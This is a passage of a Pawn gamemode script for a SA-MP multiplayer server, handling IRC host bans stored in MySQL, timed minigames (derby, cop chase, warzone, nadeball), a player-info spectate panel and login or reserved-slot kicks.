		(1) host_description    varchar(50)
		*/

		IRC_GroupSay(1, IRCOP_CHANNEL, "4>> ERROR: This host is already banned.");
	} else {
	    new mysqlStr[183],
	        msg[177];

	    mysql_real_escape_string(params, params);
   	    mysql_real_escape_string(description, description);
	 	format(mysqlStr, sizeof(mysqlStr),  "INSERT INTO "MYSQL_TABLE_HOSTBANS" (host_name, host_description) VALUES('%s', '%s')", params, description);
		mysql_run_query(mysqlConnection, mysqlStr, false, "", "");

		format(msg, sizeof(msg), "*** The HOSTNAME '%s' has been banned by %s for \"%s\".", params, user, description);
		IRC_GroupSay(1, IRCOP_CHANNEL, msg);
		printflog("IRC", msg);
	}
	return 1;
}

forward QS_UnbanPlayerHost(user[], params[]);
public QS_UnbanPlayerHost(user[], params[])
{
	querybalance--;

    new rows, fields,
		mysqlStr[117],
		msg[177];

    mysql_real_escape_string(params, params);

    cache_get_data(rows, fields);
    if (rows)
    {
        /*
		(0) host_name      		varchar(50)
		(1) host_description    varchar(50)
		*/

	 	format(mysqlStr, sizeof(mysqlStr),  "DELETE FROM "MYSQL_TABLE_HOSTBANS" WHERE `host_name` = '%s' LIMIT 1", params);
		mysql_run_query(mysqlConnection, mysqlStr, false, "", "");

		format(msg, sizeof(msg), "*** The HOSTNAME '%s' has been unbanned by %s.", params, user);
		IRC_GroupSay(1, IRCOP_CHANNEL, msg);
		printflog("IRC", msg);
	} else { // perform host match if no such host found
	 	format(mysqlStr, sizeof(mysqlStr),  "SELECT * FROM "MYSQL_TABLE_HOSTBANS" WHERE `host_name` LIKE '%%%s%%'", params);
		mysql_run_query(mysqlConnection, mysqlStr, true, "QS_BlacklistMatch", "s", params);
	}
	return 1;
}

forward QS_BlacklistMatch(params[]);
public QS_BlacklistMatch(params[])
{
	querybalance--;

    new rows, fields;

    cache_get_data(rows, fields);
    if (rows)
    {
        /*
		(0) host_name      		varchar(50)
		(1) host_description    varchar(50)
		*/

		new hostmatchStr[550];

		format(hostmatchStr, sizeof(hostmatchStr), "4[HOSTmatch \"%s\"]", params);

		for (new blacklists = 0; blacklists < rows; blacklists++)
		{
  			cache_get_row(blacklists, 0, params);
			format(hostmatchStr, sizeof(hostmatchStr), "%s %s", hostmatchStr, params);
        }
		IRC_GroupSay(1, IRCOP_CHANNEL, hostmatchStr);
	} else IRC_GroupSay(1, IRCOP_CHANNEL, "4>> ERROR: No matching HOST found in database.");
	return 1;
}

public Routine1()
{
	for (new i = 0; i < MAX_PLAYERS; i++)
	{
		if (IsPlayerConnected(i))
		{
			if (player[i][spawned] == 1)
			{
				/* GODMODE */
				if (player[i][godmode] == 1)
				{
					SetPlayerHealth(i, 100000.0);
					//SetPlayerHealth(i, Float:0x7F800000); // infinite health (people see as 0.00)
		   			if (IsPlayerDriver(i))
					SetVehicleHealth( GetPlayerVehicleID(i) , 10000.0);
				}

				/* DERBY */
				if (player[i][playingderby] == 1)
				{
				    if (derbystarted == true && derbysecondsleft == -5)
				    {
						if (player[i][AFKtickcount] < MAX_FAILED_TICKS)
						{
							player[i][AFKtickcount]++;
						} else {
		    				new vDID = GetPlayerVehicleID(i);
	    					if (vDID) DestroyVehicle(vDID);
							RemoveDerbyPlayer(i, "Pausing/Timeout");
							SetPlayerHealth(i, 0.00);
						}
				    
				        if (DerbyMode == 1)
				        {
					  		if (!IsPlayerInRangeOfPoint(i, DerbyMinimumHeight, DerbyCenterX, DerbyCenterY, DerbyCenterZ))
							{
			    				new vDID = GetPlayerVehicleID(i);
		    					if (vDID) DestroyVehicle(vDID);
								RemoveDerbyPlayer(i, "Fell off");
								SpawnPlayer(i);
							}
						} else {
						    GetVehiclePos( GetPlayerVehicleID(i), playerxyza[0], playerxyza[1], playerxyza[2]);
		  					if (playerxyza[2] < DerbyMinimumHeight)
							{
			    				new vDID = GetPlayerVehicleID(i);
		    					if (vDID) DestroyVehicle(vDID);
								RemoveDerbyPlayer(i, "Fell off");
								SpawnPlayer(i);
							}
						}
					} else {
						if (derbysecondsleft > 0)
						{
							format(stringe, sizeof(stringe), "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~w~PARTICIPANTS:~r~ %d~n~~w~STARTING IN:~r~ %d", derbyplayers, derbysecondsleft);
							GameTextForPlayer(i, stringe, 2000, 3);
							format(stringe, sizeof(stringe), "Derby starts in %d seconds: /derby", derbysecondsleft);
							SetPlayerChatBubble(i, stringe, COLOR_PINK, 100.0, 1000);
						}
					}
				}

				/* Russian Roulette */
				else if (player[i][playingrr] == 1)
				{
				    if (rrstarted == false)
				    {
						if (rrsecondsleft > 0)
						{
							format(stringe, sizeof(stringe), "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~w~PARTICIPANTS:~r~ %d~n~~w~STARTING IN:~r %d", rrplayers, rrsecondsleft);
							GameTextForPlayer(i, stringe, 2000, 3);
							format(stringe, sizeof(stringe), "Russian Roulette starts in %d seconds: /rr", rrsecondsleft);
							SetPlayerChatBubble(i, stringe, COLOR_LBLUE, 100.0, 1000);
						}
					}
				}

				/* Cop chase */
				else if (player[i][playingcc] == 1)
				{
				    if (ccstarted == false)
				    {
						if (ccsecondsleft > 0)
						{
							format(stringe, sizeof(stringe), "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~w~PARTICIPANTS:~r~ %d~n~~w~STARTING IN:~r~ %d", ccplayers, ccsecondsleft);
							GameTextForPlayer(i, stringe, 2000, 3);
							format(stringe, sizeof(stringe), "Police chase starts in %d seconds: /copchase", ccsecondsleft);
							SetPlayerChatBubble(i, stringe, COLOR_ORANGE, 100.0, 1000);
						}
					} else {
						if (player[i][AFKtickcount] < MAX_FAILED_TICKS)
						{
							player[i][AFKtickcount]++;
						} else if (currentcccriminal == i)
						{
							RemoveCCPlayer(i, "Pausing/Timeout");
							SetPlayerHealth(i, 0.00);
						}
					
					    new SVehicleID = GetPlayerSurfingVehicleID(i);
						if (SVehicleID != INVALID_VEHICLE_ID)
						{
						    new Float:SVangle;
							GetVehiclePos(SVehicleID, playerxyza[0], playerxyza[1], playerxyza[2]);
							GetVehicleZAngle(SVehicleID, SVangle);
							playerxyza[0] -= (4 * floatsin(-SVangle, degrees));
							playerxyza[1] -= (4 * floatcos(-SVangle, degrees));
							SetPlayerPos(i, playerxyza[0], playerxyza[1], playerxyza[2]);
						}
					}
				}

				/* Nadeball */
				else if (player[i][playingnb] == 1)
				{
				    if (nbstarted == false)
				    {
						if (nbsecondsleft > 0)
						{
							format(stringe, sizeof(stringe), "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~w~PARTICIPANTS:~r~ %d~n~~w~STARTING IN:~r~ %d", nbplayers, nbsecondsleft);
							GameTextForPlayer(i, stringe, 2000, 3);
							format(stringe, sizeof(stringe), "Nadeball starts in %d seconds: /nadeball", nbsecondsleft);
							SetPlayerChatBubble(i, stringe, COLOR_CORAL, 100.0, 1000);
						}
					} else {
						if (nbsecondsleft > 0)
						{
							format(stringe, sizeof(stringe), "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~w~PARTICIPANTS:~r~ %d~n~~w~STARTING IN:~r~ %d", nbplayers, nbsecondsleft);
							GameTextForPlayer(i, stringe, 2000, 3);
						} else {
							if (player[i][AFKtickcount] < MAX_FAILED_TICKS)
							{
								player[i][AFKtickcount]++;
							} else if (player[i][playernbmode] == 1)
							{
								RemoveNBPlayer(i, "Pausing/Timeout");
								SetPlayerHealth(i, 0.00);
							}
						
							format(stringe, sizeof(stringe), "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~y~PEPINOs ~w~%d ~b~] ~w~%d ~g~FRAGs", nbteam1players, nbteam2players);
							GameTextForPlayer(i, stringe, 2000, 3);
						}
					}
				}

				/* Warzone */
				else if (player[i][playingwarzone] == 1)
				{
				    if (warzonestarted == false)
				    {
						if (warzonesecondsleft > 0)
						{
							format(stringe, sizeof(stringe), "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~w~PARTICIPANTS:~r~ %d~n~~w~STARTING IN:~r~ %d", warzoneplayers, warzonesecondsleft);
							GameTextForPlayer(i, stringe, 2000, 3);
							format(stringe, sizeof(stringe), "Warzone starts in %d seconds: /warzone", warzonesecondsleft);
							SetPlayerChatBubble(i, stringe, COLOR_PINKRED, 100.0, 1000);
						}
					} else {
						if (warzonesecondsleft > 0)
						{
							format(stringe, sizeof(stringe), "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~w~PARTICIPANTS:~r~ %d~n~~w~STARTING IN:~r~ %d", warzoneplayers, warzonesecondsleft);
							GameTextForPlayer(i, stringe, 2000, 3);
						} else {
							if (player[i][AFKtickcount] < MAX_FAILED_TICKS)
							{
								player[i][AFKtickcount]++;
						  		ResetPlayerMoney(i);
							} else if (player[i][playerwarzonemode] == 1)
							{
								RemoveWarzonePlayer(i, "Pausing/Timeout");
								SetPlayerHealth(i, 0.00);
							}
						}
					}
				}

				/* STREW */
				if (player[i][strew] == 1)
				{
				    if (player[i][strewid] != -1) DeletePlayerObject(i, player[i][strewid]);

				    GetVehiclePos(GetPlayerVehicleID(i), playerxyza[0], playerxyza[1], playerxyza[2]);
				    GetVehicleZAngle(GetPlayerVehicleID(i), playerxyza[3]);
				    player[i][strewid] = CreatePlayerObject(i, 8357, playerxyza[0], playerxyza[1], playerxyza[2] - player[i][strewdist], 0, 0, playerxyza[3]);
				}

				/* VLIGHTS */
				if (player[i][vlights] == 1)
				{
					new vID = GetPlayerVehicleID(i);
					if (vID)
					{
						new panels, doors, lights, tires;

						GetVehicleDamageStatus(vID, panels, doors, lights, tires);
					    if (player[i][vlightmode] == 0)
						{
							UpdateVehicleDamageStatus(vID, panels, doors, 1, tires);
							player[i][vlightmode] = 1;
						} else {
							UpdateVehicleDamageStatus(vID, panels, doors, 4, tires);
                            player[i][vlightmode] = 0;
						}
					}
				}
				
		    	if (player[i][FPStextdraw] == 1)
				{
					format(stringo, sizeof(stringo), "FPS: %d", player[i][FPS]);
					TextDrawSetString(pinfo[i], stringo);
				}
			} // end isplayerspawned
		} // end isplayerconnected
	} // end player loop
	return 1;
}

public Routine2()
{
	for (new i = 0; i < MAX_PLAYERS; i++)
	{
		if (IsPlayerConnected(i) && !IsPlayerNPC(i))
		{
		    /* Assign account data to player */
		    if (IsPlayerRegistered(i) && !IsPlayerLoggedIn(i))
	        {
   		   		player[i][logintimeout]--;
				if (player[i][logintimeout] < 61)
				{
					format(stringe, sizeof(stringe), "~n~~n~~n~~n~~n~~n~~n~~n~~n~~w~SECONDS TO LOGIN: ~r~~h~~h~%d", player[i][logintimeout]);
					GameTextForPlayer(i, stringe, 3000, 3);
				} else GameTextForPlayer(i, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~b~YOUR ACCOUNT IS BEING INITIALIZED", 3000, 3);

				if (player[i][logintimeout] == 0)
				{
					GetPlayerName(i, playername, sizeof(playername));

		 			format(strings, sizeof(strings), "Kicked %s. (Reason: Failed to login in Secured account [Code #3])", playername);
					SendServerMessageToAll(EMBED_RED, strings);
					printflog("KICK-A", strings);
					format(tmps2, sizeof(tmps2), "8,1%s", strings);
					IRC_GroupSay(1, IRC_CHANNEL, tmps2);
					KickEx(i);

					new mysqlStr[130];
			        format(mysqlStr, sizeof(mysqlStr), "UPDATE "MYSQL_TABLE_PLAYER_LOGS" SET `player_log_kick_count` = player_log_kick_count +1 WHERE `account_id` = %d LIMIT 1", GetPlayerAccountID(i));
		      		mysql_run_query(mysqlConnection, mysqlStr, false, "", "");
				}
		    }

			if (player[i][spawned] == 1)
			{
				/* APC */
				if (player[i][apc] == 1 || autoplayercolor == true)
				SetPlayerColor(i, PlayerColors[random(sizeof(PlayerColors))]);

				/* ACC */
				if (player[i][acc] == 1 || autovehiclecolor == true)
				{
	  				if (IsPlayerDriver(i))
					//ChangeVehicleColor(GetPlayerVehicleID(i), random(127), random(127));
					ChangeVehicleColor(GetPlayerVehicleID(i), CustomVehicleColors[random(29)], CustomVehicleColors[random(29)]);
				}
			}
			
			if (player[i][SpectatingInfo] > -1) // show both when spawned and not spawned - THIS ONLY AUTO-UPDATES FOR ADMINS!
			{
				if (IsPlayerConnected(player[i][SpectatingInfo]))
				{
				    new Float:Armor,
						Float:pHealth,
						god[4],
						vgod[4];

					GetPlayerName(player[i][SpectatingInfo], giveplayername, sizeof(giveplayername));
					GetPlayerHealth(player[i][SpectatingInfo] ,pHealth);
					GetPlayerArmour(player[i][SpectatingInfo] ,Armor);

					if (player[ player[i][SpectatingInfo] ][godmode] == 1) god = "On";
					else god = "Off";

					if (player[ player[i][SpectatingInfo] ][vgodmode] == 1) vgod = "On";
					else vgod = "Off";

				    new spect[15],
						location[25] = "Unknown";

					GetPlayer2DZone(player[i][SpectatingInfo], location, sizeof(location));
					GetPlayerPos(player[i][SpectatingInfo], playerxyza[0], playerxyza[1], playerxyza[2]);
					GetPlayerFacingAngle(player[i][SpectatingInfo], playerxyza[3]);

					GetPlayerIp(player[i][SpectatingInfo], playerip, sizeof(playerip));
					if (player[player[i][SpectatingInfo]][Spectating] == 1) format(spect, sizeof(spect), "Yes (ID: %d)", player[player[i][SpectatingInfo]][SpectatingOn]);
					else spect = "No";

					if (player[i][ADMIN] >= player[player[i][SpectatingInfo]][ADMIN])
					{
						TextDrawSetString(pmsg2[i], "\
						~b~Player info~n~~n~~r~\
						Name:~n~\
						Spectating:~n~\
						God / VGod:~n~\
						Health:~n~\
						Armour:~n~\
						Location:~n~\
						World:~n~\
						XYZA:~n~\
						IP:~n~\
						Playtime:\
						");

						format(infostr, sizeof(infostr), "\
						~n~~n~~w~\
						%s ~y~(id: %d | ping: %d)~n~\
						%s~n~\
						%s / %s~n~\
						%0.2f~n~\
						%0.2f\
						", giveplayername, player[i][SpectatingInfo], GetPlayerPing(player[i][SpectatingInfo]), spect, god, vgod, pHealth, Armor);
						TextDrawSetString(pmsg3[i], infostr);

						format(infostr, sizeof(infostr), "\
						%s~n~\
						%d~n~\
						%0.2f %0.2f %0.2f %0.2f~n~\
						%s~n~\
						%d minutes\
						", location, GetPlayerVirtualWorld(player[i][SpectatingInfo]), playerxyza[0], playerxyza[1], playerxyza[2], playerxyza[3], playerip, player[player[i][SpectatingInfo]][playtime]/60);
						TextDrawSetString(pmsg4[i], infostr);
					} else {
						TextDrawSetString(pmsg2[i], "\
						~b~Player info~n~~n~~r~\
						Name:~n~\
						God / VGod:~n~\
						Health:~n~\
						Armour:~n~\
						Location:~n~\
						XYZA:~n~\
						IP:~n~\
						Playtime:~n~\
						~n~\
						\
						");

						format(infostr, sizeof(infostr), "\
						~n~~n~~w~\
						%s ~y~(id: %d | ping: %d)~n~\
						%s / %s~n~\
						%0.2f~n~\
						%0.2f~n~\
						%s\
						", giveplayername, player[i][SpectatingInfo], GetPlayerPing(player[i][SpectatingInfo]), god, vgod, pHealth, Armor, location);
						TextDrawSetString(pmsg3[i], infostr);

						format(infostr, sizeof(infostr), "\
						%0.2f %0.2f %0.2f %0.2f~n~\
						%s~n~\
						%d minutes~n~\
						~n~\
						\
						", playerxyza[0], playerxyza[1], playerxyza[2], playerxyza[3], playerip, player[player[i][SpectatingInfo]][playtime]/60);
						TextDrawSetString(pmsg4[i], infostr);
					}
				} else { // disconnected
					player[i][SpectatingInfo] = -1;
					GameTextForPlayer(i, "~r~/GETINFO PLAYER~n~DISCONNECTED", 5000, 6);
				}
			}
			player[i][playtime]++;
		} // end isplayerconnected
	} // end player loop
	return 1;
}

public Routine3()
{
	/* Derby */
	if (derbysecondsleft > -5)
	{
	    derbysecondsleft--;

	    if (derbystarted == false)
	    {
			if (derbysecondsleft == 8) PreloadDerby();
	        else if (derbysecondsleft == 5) LoadDerby();
	    	else if (derbysecondsleft == 0) StartDerby();
	    }
	}

	/* Russian Roulette */
	if (rrsecondsleft > -5)
	{
	    rrsecondsleft--;

	    if (rrstarted == false)
	    {
			if (rrsecondsleft == 5) LoadRR();
	    	else if (rrsecondsleft == 0) StartRR();
	    }
	} else if (rrstarted == true)
	{
		rrsecondslefttillnext--;

		if (rrsecondslefttillnext == 0)
		{
		    new rrname[24];
			GetPlayerName(currentrruser, rrname, sizeof(rrname));
			format(stringe, sizeof(stringe), "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~rejecting %s~n~for being afk", rrname);
			SendMessageToRR(stringe, 5000);
			RemoveRRPlayer(currentrruser, "AFK");
			SetTimerEx("SetRRPhase", 5000, 0, "d", 1);
		}
	}

	/* Cop chase */
	if (ccsecondsleft > -5)
	{
	    ccsecondsleft--;

	    if (ccstarted == false)
	    {
			if (ccsecondsleft == 10) PreloadCC();
	        else if (ccsecondsleft == 5) LoadCC();
	    	else if (ccsecondsleft == 0) StartCC();
	    }
	} else if (ccstarted == true)
	{
		ccsecondslefttillend--;
		ccsecondslefttillstatusupdate--,
		ccsecondslefttilllocationupdate--;

		if (ccsecondslefttillend == 0)
		{
		    new ccname[24];
			GetPlayerName(currentcccriminal, ccname, sizeof(ccname));
			format(stringe, sizeof(stringe), "%s has won from the cops!", ccname);
			SendServerMessageToAll(EMBED_ORANGE, stringe);
			format(stringe, sizeof(stringe), "2 %s has won from the cops!", ccname);
			IRC_GroupSay(1, IRC_CHANNEL, stringe);
			format(stringe, sizeof(stringe), "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~r~%s~n~~w~has won from the cops!", ccname);
			for (new dp = 0; dp < MAX_PLAYERS; dp++)
			{
				if (IsPlayerConnected(dp) && player[dp][playingcc] == 1)
				{
					GameTextForPlayer(dp, stringe, 5000, 3);
					TextDrawHideForPlayer(dp, ccstatus[dp]);
					TextDrawHideForPlayer(dp, ccstatus2);
					TextDrawHideForPlayer(dp, ccstatus3);
					TextDrawHideForPlayer(dp, ccstatus4);
					TextDrawHideForPlayer(dp, ccstatus5);
					if (servergodmode) player[dp][godmode] = 1;
					SetPlayerColor(dp, PlayerColors[random(sizeof(PlayerColors))]);
					player[dp][playingcc] = 0;
					player[dp][playerccmode] = 0;
	 				RemovePlayerFromVehicleEx(dp);
					SpawnPlayer(dp);
					player[dp][moviecrew] = -1;
					if (player[dp][chat] == 3) player[dp][chat] = 0;
				   	ResetBounds(dp);
					SetPlayerTeam(dp, dp);
				}
			}
			StopCC();
		}
		if (ccsecondslefttillstatusupdate == 0)
		{
		    UpdateCCStatus();
			ccsecondslefttillstatusupdate = 10;
		}
		if (ccsecondslefttilllocationupdate == 0)
		{
		    SetPlayerColor(currentcccriminal, COLOR_RED);
		    SetTimer("SetCriminalInvisible", 5000, 0);

		    new location[25] = "Unknown";

			GetPlayer2DZone(currentcccriminal, location, sizeof(location));
			format(stringe, sizeof(stringe), "~y~Police Radio:~n~~w~Suspect last seen in~n~%s", location);
			for (new ccP = 0; ccP < MAX_COPCHASE_PLAYERS; ccP++)
			{
				if (ccplayerlist[ccP] == -1)
				continue;

			    if (player[ ccplayerlist[ccP] ][playingcc] == 1 && ccplayerlist[ccP] != currentcccriminal)
			    GameTextForPlayer(ccplayerlist[ccP], stringe, 5000, 6);
			}
			
			if (ccplayers > 4) ccsecondslefttilllocationupdate = 120;
			else ccsecondslefttilllocationupdate = 60;
		}
	}

	/* Nadeball */
	if (nbsecondsleft > -5)
	{
	    nbsecondsleft--;

	    if (nbstarted == false)
	    {
	        if (nbsecondsleft == 5) LoadNB();
	    	else if (nbsecondsleft == 0) StartNB();
	    } else {
	        if (nbsecondsleft == 5) ReloadNB();
	    	else if (nbsecondsleft == 0) StartNB();
	    }
	}
	
	/* Warzone */
	if (warzonesecondsleft > -2)
	{
	    warzonesecondsleft--;

	    if (warzonestarted == false)
	    {
	        if (warzonesecondsleft == 5) LoadWarzone();
	    	else if (warzonesecondsleft == 0) StartWarzone();
		}
	} else if (warzonestarted == true)
	{
		if (warzoneminuteslefttillend > 0 || warzonesecondslefttillend > -0)
		{
		    new statusStr[88],
		        Float:pHP,
		        Float:pAP,
			    warzoneattackershealth = 0,
			    warzonedefendershealth = 0,
				warzoneattackershealthcolour[4],
				warzonedefendershealthcolour[4];

			for (new wzP = 0; wzP < MAX_WARZONE_PLAYERS; wzP++)
			{
				if (!IsPlayerConnected( warzoneplayerlist[wzP] ) || warzoneplayerlist[wzP] == -1)
				continue;
			
				if (player[ warzoneplayerlist[wzP] ][playerwarzonemode] == 1)
				{
			        GetPlayerHealth(warzoneplayerlist[wzP], pHP);
			        GetPlayerArmour(warzoneplayerlist[wzP], pAP);
			        if (player[ warzoneplayerlist[wzP] ][playerwarzoneteam] == 1) warzoneattackershealth += (((floatround(pHP) + floatround(pAP)) / 2) / warzoneattackers);
					else warzonedefendershealth += (((floatround(pHP) + floatround(pAP)) / 2) / warzonedefenders);
				}
				if (warzonesecondslefttillcap < 31)
			    PlayerPlaySound(warzoneplayerlist[wzP], 1057, 0.0, 0.0, 0.0);
		    }

		    if (warzoneattackershealth > 66) warzoneattackershealthcolour = "~g~";
		    else if (warzoneattackershealth > 33) warzoneattackershealthcolour = "~y~";
		    else warzoneattackershealthcolour = "~r~";

		    if (warzonedefendershealth > 66) warzonedefendershealthcolour = "~g~";
		    else if (warzonedefendershealth > 33) warzonedefendershealthcolour = "~y~";
		    else warzonedefendershealthcolour = "~r~";

			format(statusStr, sizeof(statusStr), "~r~Attackers ~w~(%d/%d) %s%d%% ~w~- %s%d%% ~w~(%d/%d) ~b~Defenders", warzoneattackersleft, warzoneattackers, warzoneattackershealthcolour, warzoneattackershealth, warzonedefendershealthcolour, warzonedefendershealth, warzonedefendersleft, warzonedefenders);
			TextDrawSetString(wzstatustd1, statusStr);

			if (warzonesecondslefttillcap == 31)
			{
				if (warzoneminuteslefttillend > 6) format(statusStr, sizeof(statusStr), "~n~Time left: ~g~%d:%02d", warzoneminuteslefttillend, warzonesecondslefttillend);
				else if (warzoneminuteslefttillend > 3) format(statusStr, sizeof(statusStr), "~n~Time left: ~y~%d:%02d", warzoneminuteslefttillend, warzonesecondslefttillend);
				else format(statusStr, sizeof(statusStr), "~n~Time left: ~r~%d:%02d", warzoneminuteslefttillend, warzonesecondslefttillend);
				
				TextDrawSetString(wzstatustd2, statusStr);
			} else {
				if (warzonesecondslefttillcap > 20) format(statusStr, sizeof(statusStr), "~r~Time to capture: %d~n~~w~Time left: ~r~%d:%02d", warzonesecondslefttillcap, warzoneminuteslefttillend, warzonesecondslefttillend);
				else if (warzonesecondslefttillend > 10) format(statusStr, sizeof(statusStr), "~r~Time to capture: %d~n~~w~Time left: ~r~%d:%02d", warzonesecondslefttillcap, warzoneminuteslefttillend, warzonesecondslefttillend);
				else format(statusStr, sizeof(statusStr), "~r~Time to capture: %d~n~~w~Time left: ~r~%d:%02d", warzonesecondslefttillcap, warzoneminuteslefttillend, warzonesecondslefttillend);
				
				warzonesecondslefttillcap--;
				TextDrawSetString(wzstatustd2, statusStr);
				
				if (warzonesecondslefttillcap == 0)
				{
					StopWarzone();
					for (new cp = 0; cp < MAX_PLAYERS; cp++)
					{
						if (IsPlayerConnected(cp) && player[cp][playingwarzone] == 1)
						{
							if (servergodmode) player[cp][godmode] = 1;
							SetPlayerColor(cp, PlayerColors[random(sizeof(PlayerColors))]);
							player[cp][playingwarzone] = 0;
							player[cp][playerwarzoneteam] = 0;
							if (player[cp][playerwarzonemode] == 1)
							{
								SpawnPlayer(cp);
								player[cp][playerwarzonemode] = 0;
							} else {
								player[cp][Spectating] = 0;
								player[cp][SpectatingOn] = -1;
							    TogglePlayerSpectating(cp, false);
							}
						 	player[cp][playerwarzoneset] = 0;
							player[cp][moviecrew] = -1;
							SetPlayerTeam(cp, cp);
							SetPlayerArmour(cp, 0.00);
						}
					}
					SendServerMessageToAll(EMBED_PINKRED, "The "EMBED_RED"Attackers"EMBED_PINKRED" have captured the checkpoint and won!");
					IRC_GroupSay(1, IRC_CHANNEL, "6The 4Attackers 6have captured the checkpoint and won!");
				}
			}

			if (warzonesecondslefttillend > 0)
			{
				warzonesecondslefttillend--;
			} else if (warzoneminuteslefttillend > 0)
			{
			    warzoneminuteslefttillend--;
			    warzonesecondslefttillend = 59;
			}
		} else {
			StopWarzone();
			for (new cp = 0; cp < MAX_PLAYERS; cp++)
			{
				if (IsPlayerConnected(cp) && player[cp][playingwarzone] == 1)
				{
					if (servergodmode) player[cp][godmode] = 1;
					SetPlayerColor(cp, PlayerColors[random(sizeof(PlayerColors))]);
					player[cp][playingwarzone] = 0;
					player[cp][playerwarzoneteam] = 0;
					if (player[cp][playerwarzonemode] == 1)
					{
						SpawnPlayer(cp);
						player[cp][playerwarzonemode] = 0;
					} else {
						player[cp][Spectating] = 0;
						player[cp][SpectatingOn] = -1;
					    TogglePlayerSpectating(cp, false);
					}
				 	player[cp][playerwarzoneset] = 0;
					player[cp][moviecrew] = -1;
					SetPlayerTeam(cp, cp);
					SetPlayerArmour(cp, 0.00);
				}
			}
			SendServerMessageToAll(EMBED_PINKRED, "The "EMBED_BLUE"Defenders"EMBED_PINKRED" have defended the base and won!");
			IRC_GroupSay(1, IRC_CHANNEL, "6The 12Defenders 6have defended the base and won!");
		}
	}

	/* Vote System */
	if (votesys == true)
	{
	    votesysleft--;
	    if (votesysleft == 15)	SendServerMessageToAll(EMBED_ORANGE, "Vote will end in 15 seconds!");
	    else if (votesysleft <= 0)
	    {
			votesys = false;
			votesysleft = 30;

			new Yes = 0,
			    No = 0;
			for (new v = 0; v < MAX_PLAYERS; v++)
			{
			    if (IsPlayerConnected(v) && !IsPlayerNPC(v))
			    {
			        if (player[v][voted] == -1) continue; // didn't vote

					if (player[v][voted] == 1) Yes++;
					else No++;

					player[v][voted] = -1;
				}
	 		}

			format(strings, sizeof(strings), "Vote has ended: Yes = %d -|- No = %d", Yes, No);
			SendServerMessageToAll(EMBED_ORANGE, strings);
			format(strings, sizeof(strings), "7Vote has ended: Yes = %d -|- No = %d", Yes, No);
  			IRC_GroupSay(1, IRC_CHANNEL, strings);
	    }
	}

	/* Flashing Screen */
	if (screen == true)
	{
	    if (screen2 == false)
	    {
		   	TextDrawBoxColor(screentd, PlayerColors[random(sizeof(PlayerColors))]);
			TextDrawShowForAll(screentd);
			screen2 = true;
		} else if (screen2 == true)
		{
	 		TextDrawHideForAll(screentd);
	 		screen2 = false;
		}
	}
	return 1;
}

public ReservedSlotKick(playerid)
{
	GetPlayerName(playerid, playername, sizeof(playername));
	format(logstring, sizeof(logstring), "Kicked %s. (Reserved slot for donators & admins, please try again later)", playername);
	SendServerMessage(playerid, EMBED_RED, logstring);
	printflog("KICK-A", logstring);
	SendServerMessage(playerid, EMBED_ORANGE, "-> Would you like to be able to join the server any time you want? Apply for a reserved slot now!");
	SendServerMessage(playerid, EMBED_ORANGE, "www.xmovieserver.com/donate");
	
	KickEx(playerid);
	return 1;
}

forward KickPlayer(playerid);
public KickPlayer(playerid) Kick(playerid);

forward TimedKick(playerid);
public TimedKick(playerid)
{
	GetPlayerName(playerid, playername, sizeof(playername));
	SendClientMessage(playerid, COLOR_PINK, "u mad?");
	format(strings, sizeof(strings),"Kicked %s. (Reason: Blacklisted)", playername);
	SendServerMessageToAll(EMBED_RED, strings);
	printflog("KICK-A", strings);
	format(ircstring, sizeof(ircstring), "8,1Server: Kicked %s. (Reason: Blacklisted)", playername);
	IRC_GroupSay(1, IRC_CHANNEL, ircstring);
	KickEx(playerid);
	return 1;
}

public FadeIntro(playerid)
{
	switch(player[playerid][FadeStep])
	{
	    case 0: TextDrawColor(intro2[playerid], COLOR_BLACK);
	    case 1: TextDrawColor(intro2[playerid], 0xFFFFFF19);
	    case 2: TextDrawColor(intro2[playerid], 0xFFFFFF32);
	    case 3: TextDrawColor(intro2[playerid], 0xFFFFFF4B);
	    case 4: TextDrawColor(intro2[playerid], 0xFFFFFF64);
	    case 5: TextDrawColor(intro2[playerid], 0xFFFFFF7D);
	    case 6: TextDrawColor(intro2[playerid], 0xFFFFFF96);
	    case 7: TextDrawColor(intro2[playerid], 0xFFFFFFAF);
	    case 8: TextDrawColor(intro2[playerid], 0xFFFFFFC8);
	    case 9: TextDrawColor(intro2[playerid], 0xFFFFFFE1);
	    case 10: TextDrawColor(intro2[playerid], 0xFFFFFFFF);

	    case 11: TextDrawColor(intro2[playerid], 0xFFFFFFE1);
	    case 12: TextDrawColor(intro2[playerid], 0xFFFFFFC8);
	    case 13: TextDrawColor(intro2[playerid], 0xFFFFFFAF);
	    case 14: TextDrawColor(intro2[playerid], 0xFFFFFF96);
	    case 15: TextDrawColor(intro2[playerid], 0xFFFFFF7D);
	    case 16: TextDrawColor(intro2[playerid], 0xFFFFFF64);
	    case 17: TextDrawColor(intro2[playerid], 0xFFFFFF4B);
	    case 18: TextDrawColor(intro2[playerid], 0xFFFFFF32);
	    case 19: TextDrawColor(intro2[playerid], 0xFFFFFF19);
	    case 20: TextDrawColor(intro2[playerid], COLOR_BLACK);
	    case 21:
		{
			//KillTimer(player[playerid][FadeTimer]);

		    //player[playerid][FadeTimer] = -1;
			player[playerid][FadeStep] = 0;
		 	if (!player[playerid][FadeStepOn])
		 	{
				TextDrawHideForPlayer(playerid, intro2[playerid]);
				player[playerid][FadeTimer] = -1;
				return 1;
		 	}
			//return 1;
		}
	}
	player[playerid][FadeStep]++;
	TextDrawShowForPlayer(playerid, intro2[playerid]);

 	player[playerid][FadeTimer] = SetTimerEx("FadeIntro", 100, 0, "d", playerid);
 	return 1;
}

public OnPlayerRequestClass(playerid, classid)
{
	//printf("\r\n[DEBUG-STUNTA] OnPlayerRequestClass(%d, %d)", playerid, classid);

	if (IsPlayerNPC(playerid))
	return 1;

	if (!player[playerid][socreated])
	{
		player[playerid][socreated] = 1;

		// DEFAULT
		soplayer[playerid][0] = CreatePlayerObject(playerid, 16132, -1071.393798, -884.789550, 133.043441, 0.000000, 0.000000, 450.000000);
